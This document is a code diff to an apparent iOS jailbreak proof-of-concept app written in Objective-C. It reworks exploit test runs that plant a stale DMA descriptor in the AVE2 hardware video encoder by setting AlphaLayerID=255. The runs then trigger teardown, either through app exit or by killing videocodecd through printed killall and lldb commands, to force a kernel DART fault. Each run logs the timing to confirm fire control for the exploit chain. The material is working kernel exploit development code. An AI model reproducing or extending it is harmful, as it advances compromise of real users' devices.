@@ -164,6 +164,7 @@ cat > "$WORK/main.m" << 'OBJC'
 #include <dlfcn.h>
 #include <sys/utsname.h>
 #include <sys/sysctl.h>
+#include <os/log.h>
 
 // ============================================================
 // Global log buffer — feeds both NSLog and the on-screen view
@@ -2888,24 +2889,35 @@ static void runRunB_v2(void) {
 }
 
 // ============================================================
-// Run C: Daemon-kill fire-control test
-// Arms with Alpha=255, then immediately tears down ALL sessions
-// and exits the app to force videocodecd termination.
-// Tests whether explicit daemon death produces fast deterministic panic.
+// Run C1: Client-death fire-control test (app-side only)
+//
+// Tests the AVE_ClientClose path: app death drops XPC connection
+// to videocodecd → kext client count hits zero → AVE_SessionDestroy
+// → AVE_SurfaceMgr_Cleanup → ReleaseDelayed → DARTUnmapSurface_TwoPhase
+// → stale descriptor fires into unmapped DVA → DART fault.
+//
+// CRITICAL: session is NOT invalidated before exit. The armed session
+// is alive when the process dies, so XPC drop is the ONLY trigger.
+// Invalidating first would be Run A territory again.
+//
+// If panic fires within seconds of exit(0): unprivileged app alone
+// controls fire timing. Best possible outcome for the exploit chain.
 // ============================================================
 
-static void runRunC(void) {
+static void runRunC1(void) {
     if (g_phase2Running) {
         INFO(@"Phase 2 test already running — wait for it.");
         return;
     }
     g_phase2Running = YES;
 
+    os_log_t runcLog = os_log_create("com.jbpoc.runc", "fire-control");
+
     pocLog(@"");
     pocLog(@"╔══════════════════════════════════════════╗");
-    pocLog(@"║  RUN C: Daemon-Kill Fire-Control Test     ║");
-    pocLog(@"║  Alpha=255 arm → teardown → app exit      ║");
-    pocLog(@"║  Tests: panic timing vs daemon death       ║");
+    pocLog(@"║  RUN C1: Client-Death Fire-Control        ║");
+    pocLog(@"║  Alpha=255 arm → NO invalidate → exit(0)  ║");
+    pocLog(@"║  Tests: AVE_ClientClose path (Ghidra #3)  ║");
     pocLog(@"║  *** WILL CAUSE KERNEL PANIC ***           ║");
     pocLog(@"╚══════════════════════════════════════════╝");
     pocLog(@"");
@@ -2915,16 +2927,18 @@ static void runRunC(void) {
 
     // Step 1: Canary
     LOG(@"--- STEP 1: CANARY (AlphaLayerID=0) ---");
+    os_log(runcLog, "JBPoC-RUN-C1-CANARY-START");
     BOOL canary = phase2Encode(0, @"CANARY");
     if (!canary) {
         FAIL(@"CANARY FAILED — AVE2 wedged. Reboot phone.");
+        os_log_error(runcLog, "JBPoC-RUN-C1-CANARY-FAILED");
         g_phase2Running = NO;
         return;
     }
     PASS(@"CANARY OK — encoder healthy.");
     idleWait(5, @"canary cooldown");
 
-    // Step 2: Arm with Alpha=255
+    // Step 2: Arm with Alpha=255 — keep session alive
     LOG(@"--- STEP 2: ARM with AlphaLayerID=255 ---");
     NSDictionary *spec = @{
         (NSString *)kVTVideoEncoderSpecification_EnableHardwareAcceleratedVideoEncoder: @YES,
@@ -2967,11 +2981,13 @@ static void runRunC(void) {
     }
 
     g_narrowGotOutput = NO;
-    g_oracleContext = @"runC-arm";
+    g_oracleContext = @"runC1-arm";
 
-    LOG(@"*** ENCODING WITH AlphaLayerID=255 (arming stale DMA descriptor) ***");
     NSString *armTime = [fmt stringFromDate:[NSDate date]];
+    LOG(@"*** ENCODING WITH AlphaLayerID=255 (arming stale DMA descriptor) ***");
     LOG(@"ARM time: %@", armTime);
+    os_log(runcLog, "JBPoC-RUN-C1-ARM %{public}@", armTime);
+
     status = VTCompressionSessionEncodeFrame(session, pb,
         CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, NULL);
     INFO(@"EncodeFrame: %d (%s)", (int)status,
@@ -2987,79 +3003,80 @@ static void runRunC(void) {
 
     if (!armed) {
         INFO(@"WARNING: Got output (no -17691). Continuing anyway.");
+        os_log(runcLog, "JBPoC-RUN-C1-ARM-WARNING not-armed");
     } else {
         PASS(@"Armed: -17691 error path taken. Stale DMA descriptor planted.");
+        os_log(runcLog, "JBPoC-RUN-C1-ARMED confirmed");
     }
     pocLog(@"");
 
-    // Step 3: Immediate full teardown
-    LOG(@"--- STEP 3: IMMEDIATE SESSION TEARDOWN ---");
-    LOG(@"Teardown start: %@", [fmt stringFromDate:[NSDate date]]);
-    VTCompressionSessionInvalidate(session);
-    CFRelease(session);
-    session = NULL;
-    LOG(@"Session invalidated + released: %@", [fmt stringFromDate:[NSDate date]]);
+    // Step 3: NO INVALIDATE — exit with session alive
+    LOG(@"--- STEP 3: EXIT (session NOT invalidated) ---");
+    INFO(@"Session deliberately kept alive. XPC drop on exit is the");
+    INFO(@"sole trigger for AVE_ClientClose → count==0 → teardown.");
     pocLog(@"");
 
-    // Step 4: Choose exit strategy
-    // Strategy A: Exit app to drop all XPC connections to videocodecd
-    // Strategy B: Stay alive and wait, let system decide when to kill daemon
-    // We do BOTH: wait 10s first (strategy B), then exit (strategy A)
+    // Write state file before exit (survives app death)
+    NSString *docs = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents"];
+    [[NSFileManager defaultManager] createDirectoryAtPath:docs
+        withIntermediateDirectories:YES attributes:nil error:nil];
+    NSString *stateFile = [docs stringByAppendingPathComponent:@"runc1_state.txt"];
+    NSString *exitTime = [fmt stringFromDate:[NSDate date]];
+    NSString *stateData = [NSString stringWithFormat:
+        @"RUN-C1 state\narmed_at=%@\nexit_at=%@\narmed=%@\nsession_invalidated=NO\n",
+        armTime, exitTime, armed ? @"YES" : @"NO"];
+    [stateData writeToFile:stateFile atomically:YES
+        encoding:NSUTF8StringEncoding error:nil];
+    int fd = open([stateFile UTF8String], O_RDONLY);
+    if (fd >= 0) { fsync(fd); close(fd); }
 
-    LOG(@"--- STEP 4: FIRE CONTROL ---");
-    INFO(@"Waiting 10s for natural daemon teardown...");
-    INFO(@"If phone panics during this wait = strategy B works.");
+    LOG(@"State written to %@", stateFile);
+    LOG(@"ARM: %@  EXIT: %@", armTime, exitTime);
     pocLog(@"");
 
-    for (int s = 10; s > 0; s--) {
-        LOG(@"  T+%ds: %@ — still alive", 10 - s + 1, [fmt stringFromDate:[NSDate date]]);
-        [NSThread sleepForTimeInterval:1.0];
-    }
-    pocLog(@"");
+    // os_log markers — these survive in syslog after app death
+    os_log(runcLog, "JBPoC-RUN-C1-EXIT arm=%{public}@ exit=%{public}@", armTime, exitTime);
+    NSLog(@"JBPoC-RUN-C1-EXIT arm=%@ exit=%@", armTime, exitTime);
 
-    // If we're still here, natural teardown didn't fire fast enough.
-    // Try strategy A: exit the app to force videocodecd client disconnect.
-    LOG(@"=== NO PANIC IN 10s — FORCING APP EXIT ===");
-    LOG(@"Exit time: %@", [fmt stringFromDate:[NSDate date]]);
-    INFO(@"App exiting to drop videocodecd XPC connection.");
-    INFO(@"videocodecd should be terminated by launchd shortly.");
-    INFO(@"Record wall-clock: if panic fires within seconds of");
-    INFO(@"this timestamp, fire-control is CONFIRMED.");
-    pocLog(@"");
-    LOG(@"ARM time was: %@", armTime);
-    LOG(@"EXIT time is: %@", [fmt stringFromDate:[NSDate date]]);
-    pocLog(@"");
+    // Tiny pause so logs flush to syslog daemon
+    [NSThread sleepForTimeInterval:0.3];
 
-    // Flush logs before exit
-    [NSThread sleepForTimeInterval:0.5];
-    NSLog(@"[RUN-C] ARM=%@ EXIT=%@ — EXITING NOW",
-        armTime, [fmt stringFromDate:[NSDate date]]);
+    os_log(runcLog, "JBPoC-RUN-C1-EXIT-NOW");
 
-    // Force exit to drop all XPC connections
     exit(0);
 }
 
 // ============================================================
-// Run C-alt: Stay-alive variant with continuous timing
-// Same as Run C but doesn't exit — watches for panic while logging timestamps.
-// Use when you want to capture the exact timing without losing the log.
-// Manual kill: from Mac, run `idevicedebug kill <bundleid>` or
-// the deploy script's kill helper.
+// Run C2: Forced daemon-death test (needs Mac-side kill)
+//
+// Tests the discriminating prediction of the unified model:
+// if daemon death (not client death) unmaps the surface, C2
+// fires within seconds of the external kill regardless of
+// app state.
+//
+// Protocol: arm → app stays alive holding the session → log
+// timestamps in a loop → user kills videocodecd from Mac
+// (lldb attach + kill, or Xcode process kill) → watch for panic.
+//
+// The session is NOT invalidated. App holds XPC connection alive.
+// Only the external daemon kill triggers the teardown.
 // ============================================================
 
-static void runRunC_alt(void) {
+static void runRunC2(void) {
     if (g_phase2Running) {
         INFO(@"Phase 2 test already running — wait for it.");
         return;
     }
     g_phase2Running = YES;
 
+    os_log_t runcLog = os_log_create("com.jbpoc.runc", "fire-control");
+
     pocLog(@"");
     pocLog(@"╔══════════════════════════════════════════╗");
-    pocLog(@"║  RUN C-alt: Stay-Alive Timing Capture    ║");
-    pocLog(@"║  Alpha=255 arm → teardown → watch 5min   ║");
-    pocLog(@"║  Kill videocodecd from Mac when prompted  ║");
-    pocLog(@"║  *** WILL CAUSE KERNEL PANIC ***          ║");
+    pocLog(@"║  RUN C2: Forced Daemon-Death Test         ║");
+    pocLog(@"║  Alpha=255 arm → hold session → wait      ║");
+    pocLog(@"║  Kill videocodecd from Mac when prompted   ║");
+    pocLog(@"║  *** WILL CAUSE KERNEL PANIC ***           ║");
     pocLog(@"╚══════════════════════════════════════════╝");
     pocLog(@"");
 
@@ -3068,6 +3085,7 @@ static void runRunC_alt(void) {
 
     // Step 1: Canary
     LOG(@"--- STEP 1: CANARY ---");
+    os_log(runcLog, "JBPoC-RUN-C2-CANARY-START");
     BOOL canary = phase2Encode(0, @"CANARY");
     if (!canary) {
         FAIL(@"CANARY FAILED — AVE2 wedged. Reboot phone.");
@@ -3077,8 +3095,8 @@ static void runRunC_alt(void) {
     PASS(@"CANARY OK.");
     idleWait(5, @"canary cooldown");
 
-    // Step 2: Arm
-    LOG(@"--- STEP 2: ARM ---");
+    // Step 2: Arm — keep session alive, NO invalidation
+    LOG(@"--- STEP 2: ARM (session held open) ---");
     NSDictionary *spec = @{
         (NSString *)kVTVideoEncoderSpecification_EnableHardwareAcceleratedVideoEncoder: @YES,
         (NSString *)kVTVideoEncoderSpecification_RequireHardwareAcceleratedVideoEncoder: @YES,
@@ -3099,6 +3117,7 @@ static void runRunC_alt(void) {
     status = VTSessionSetProperty(session,
         CFSTR("RequiredHEVCVideoParameterSetAlphaLayerID"),
         (__bridge CFTypeRef)@(255));
+    INFO(@"SET AlphaLayerID=255: %s", status == noErr ? "OK" : "REJECTED");
 
     status = VTCompressionSessionPrepareToEncodeFrames(session);
     if (status != noErr) {
@@ -3119,54 +3138,79 @@ static void runRunC_alt(void) {
     }
 
     g_narrowGotOutput = NO;
-    g_oracleContext = @"runC-alt-arm";
+    g_oracleContext = @"runC2-arm";
 
     NSString *armTime = [fmt stringFromDate:[NSDate date]];
     LOG(@"ARM time: %@", armTime);
+    os_log(runcLog, "JBPoC-RUN-C2-ARM %{public}@", armTime);
+
     status = VTCompressionSessionEncodeFrame(session, pb,
         CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, NULL);
+    INFO(@"EncodeFrame: %d (%s)", (int)status,
+        status == noErr ? "submitted" : "error");
+
     VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
     [NSThread sleepForTimeInterval:2.0];
 
     BOOL armed = !g_narrowGotOutput;
     INFO(@"Armed: %@ (-17691 = YES)", armed ? @"YES" : @"NO");
     CVPixelBufferRelease(pb);
+    os_log(runcLog, "JBPoC-RUN-C2-ARMED %{public}@", armed ? @"YES" : @"NO");
 
-    // Step 3: Teardown
-    LOG(@"--- STEP 3: TEARDOWN ---");
-    NSString *teardownTime = [fmt stringFromDate:[NSDate date]];
-    LOG(@"Teardown: %@", teardownTime);
-    VTCompressionSessionInvalidate(session);
-    CFRelease(session);
-    session = NULL;
-    LOG(@"Session destroyed: %@", [fmt stringFromDate:[NSDate date]]);
+    if (!armed) {
+        INFO(@"WARNING: Got output (no -17691). Continuing anyway.");
+    }
     pocLog(@"");
 
-    // Step 4: Stay alive, log continuously
-    LOG(@"╔══════════════════════════════════════════╗");
-    LOG(@"║  KILL videocodecd FROM MAC NOW!           ║");
-    LOG(@"║  Run: killall videocodecd                 ║");
-    LOG(@"║  Or: idevicedebug kill [bundleid]         ║");
-    LOG(@"╚══════════════════════════════════════════╝");
+    // Step 3: Hold session, wait for external kill
+    LOG(@"--- STEP 3: WAITING — SESSION HELD OPEN ---");
+    LOG(@"Session NOT invalidated. App holding XPC connection alive.");
+    pocLog(@"");
+    LOG(@"╔══════════════════════════════════════════════════╗");
+    LOG(@"║  KILL videocodecd FROM MAC NOW!                   ║");
+    LOG(@"║                                                   ║");
+    LOG(@"║  Option A (Xcode):                                ║");
+    LOG(@"║    Debug > Attach to Process > videocodecd        ║");
+    LOG(@"║    Then: Debug > Detach (or kill via lldb)        ║");
+    LOG(@"║                                                   ║");
+    LOG(@"║  Option B (lldb from terminal):                   ║");
+    LOG(@"║    xcrun lldb                                     ║");
+    LOG(@"║    platform select remote-ios                     ║");
+    LOG(@"║    process attach --name videocodecd              ║");
+    LOG(@"║    kill                                           ║");
+    LOG(@"║                                                   ║");
+    LOG(@"║  Option C (if SSH/root available):                ║");
+    LOG(@"║    killall videocodecd                            ║");
+    LOG(@"╚══════════════════════════════════════════════════╝");
     pocLog(@"");
 
     LOG(@"Continuous timing — last line before panic is the fire delay:");
-    LOG(@"ARM: %@  TEARDOWN: %@", armTime, teardownTime);
+    LOG(@"ARM: %@", armTime);
+    os_log(runcLog, "JBPoC-RUN-C2-WAIT-START arm=%{public}@", armTime);
     pocLog(@"");
 
-    // Log every second for 5 minutes. Last line printed = delay before panic.
     for (int s = 1; s <= 300; s++) {
         [NSThread sleepForTimeInterval:1.0];
+        NSString *now = [fmt stringFromDate:[NSDate date]];
         if (s <= 30 || s % 10 == 0) {
-            LOG(@"T+%03ds: %@ — alive (arm was %@)",
-                s, [fmt stringFromDate:[NSDate date]], armTime);
+            LOG(@"T+%03ds: %@ — alive", s, now);
+        }
+        if (s % 30 == 0) {
+            os_log(runcLog, "JBPoC-RUN-C2-ALIVE T+%ds %{public}@", s, now);
         }
     }
 
     pocLog(@"");
-    PASS(@"=== RUN C-alt: NO PANIC IN 5 MIN ===");
-    INFO(@"ARM: %@  TEARDOWN: %@", armTime, teardownTime);
-    INFO(@"videocodecd may not have been killed, or model is wrong.");
+    PASS(@"=== RUN C2: NO PANIC IN 5 MIN ===");
+    INFO(@"ARM: %@", armTime);
+    INFO(@"videocodecd was not killed, or daemon death doesn't");
+    INFO(@"trigger the unmap while app holds XPC connection.");
+    os_log(runcLog, "JBPoC-RUN-C2-NO-PANIC arm=%{public}@", armTime);
+
+    // Clean up since we're still alive
+    LOG(@"Cleaning up session...");
+    VTCompressionSessionInvalidate(session);
+    CFRelease(session);
     g_phase2Running = NO;
 }
 
@@ -3679,7 +3723,7 @@ static void runTier2Probe(void) {
     [runBv2Btn addTarget:self action:@selector(runRunBv2) forControlEvents:UIControlEventTouchUpInside];
     [self.view addSubview:runBv2Btn];
 
-    // Run C buttons — row 8: daemon-kill fire-control test
+    // Run C1/C2 buttons — row 8: fire-control tests
     CGFloat row8 = row7 + btnH + gap;
     CGFloat runCBtnW = (w - pad * 2 - gap) / 2;
 
@@ -3690,9 +3734,9 @@ static void runTier2Probe(void) {
     runCBtn.layer.borderWidth = 2;
     runCBtn.layer.borderColor = [UIColor colorWithRed:1.0 green:0.0 blue:0.6 alpha:1].CGColor;
     runCBtn.titleLabel.font = [UIFont boldSystemFontOfSize:11];
-    [runCBtn setTitle:@"Run C: Kill+Exit" forState:UIControlStateNormal];
+    [runCBtn setTitle:@"C1: Client Death" forState:UIControlStateNormal];
     [runCBtn setTitleColor:[UIColor colorWithRed:1.0 green:0.0 blue:0.6 alpha:1] forState:UIControlStateNormal];
-    [runCBtn addTarget:self action:@selector(runRunC) forControlEvents:UIControlEventTouchUpInside];
+    [runCBtn addTarget:self action:@selector(runRunC1) forControlEvents:UIControlEventTouchUpInside];
     [self.view addSubview:runCBtn];
 
     UIButton *runCAltBtn = [UIButton buttonWithType:UIButtonTypeSystem];
@@ -3702,9 +3746,9 @@ static void runTier2Probe(void) {
     runCAltBtn.layer.borderWidth = 2;
     runCAltBtn.layer.borderColor = [UIColor colorWithRed:1.0 green:0.0 blue:0.6 alpha:1].CGColor;
     runCAltBtn.titleLabel.font = [UIFont boldSystemFontOfSize:11];
-    [runCAltBtn setTitle:@"Run C-alt: Watch" forState:UIControlStateNormal];
+    [runCAltBtn setTitle:@"C2: Daemon Kill" forState:UIControlStateNormal];
     [runCAltBtn setTitleColor:[UIColor colorWithRed:1.0 green:0.0 blue:0.6 alpha:1] forState:UIControlStateNormal];
-    [runCAltBtn addTarget:self action:@selector(runRunCAlt) forControlEvents:UIControlEventTouchUpInside];
+    [runCAltBtn addTarget:self action:@selector(runRunC2) forControlEvents:UIControlEventTouchUpInside];
     [self.view addSubview:runCAltBtn];
 
     CGFloat logTop = row8 + btnH + gap;
@@ -3822,15 +3866,15 @@ static void runTier2Probe(void) {
     });
 }
 
-- (void)runRunC {
+- (void)runRunC1 {
     dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
-        runRunC();
+        runRunC1();
     });
 }
 
-- (void)runRunCAlt {
+- (void)runRunC2 {
     dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
-        runRunC_alt();
+        runRunC2();
     });
 }
 
